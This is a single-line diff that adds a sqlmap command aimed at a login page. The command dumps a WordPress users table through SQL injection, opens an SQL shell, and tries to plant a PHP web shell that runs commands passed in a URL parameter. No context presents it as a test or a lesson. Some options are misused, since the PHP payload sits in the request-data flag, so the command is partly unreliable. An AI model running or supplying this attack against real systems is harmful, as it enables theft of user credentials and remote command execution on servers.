@@ -1,0 +1,1 @@
+sqlmap -u "http://target-web-app.com/login.php?id=1" --forms --batch -D wordpress_db -T users --dump --sql-shell --file-write /var/www/html/shell.php --file-dest /var/www/html/shell.php --data "<?php system($_GET['cmd']); ?>"
